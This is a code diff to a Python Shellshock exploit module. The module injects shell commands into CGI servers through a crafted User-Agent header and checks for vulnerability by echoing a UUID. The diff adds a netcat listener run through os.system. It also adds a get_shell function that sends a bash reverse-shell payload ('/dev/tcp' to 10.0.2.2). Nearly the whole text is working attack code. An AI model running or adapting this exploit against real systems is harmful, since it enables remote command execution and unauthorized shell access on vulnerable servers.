@@ -1,5 +1,6 @@
 #!/usr/bin/env python3.4
 # -*- coding: utf-8 -*-
+import os
 import requests
 
 from uuid import uuid4
@@ -9,25 +10,29 @@ def is_vulnerable(url):
     check = str(uuid4())
     command = "echo {}".format(check)
     resp = send_command(url, command)
-    if (check == resp.text[:len(check)]):
+    if (check == resp[:len(check)]):
         return True
     return False
 
 
-def get_shell():
-    pass
+def make_listener(url, port=8080):
+    cmd = "nc -l -p {} -vvv".format(port)
+    print(cmd)
+    return os.system(cmd)
 
 
-def send_command(url, command, path=None):
-    ua = "() { :;};"
-    ua += "export {};".format(path)
-    ua += "echo 'Content-type: text/plain'; echo; "
-    if path:
-        ua += "PATH={} ".format(path)
-    ua += command 
-    ua += "; exit;"
+def get_shell(url, host="10.0.2.2", port=8080):
+    cmd = "bash -i >& /dev/tcp/{}/{} 0>&1".format(host, port)
+    print("sending {}".format(cmd))
+    send_command(url, cmd)
+
+
+def send_command(url, command, path="/usr/sbin:/usr/bin:/sbin:/bin"):
+    ua = "() { :;}; echo 'Content-type: text/plain'; echo; "
+    ua += "PATH={} ".format(path)
+    ua += "{}; exit".format(command)
     headers = {"User-Agent": ua}
-    return requests.get(url, headers=headers)
+    return requests.get(url, headers=headers).text[:-1]
 
 
 __all__ = ["get_shell", "is_vulnerable", "send_command"]
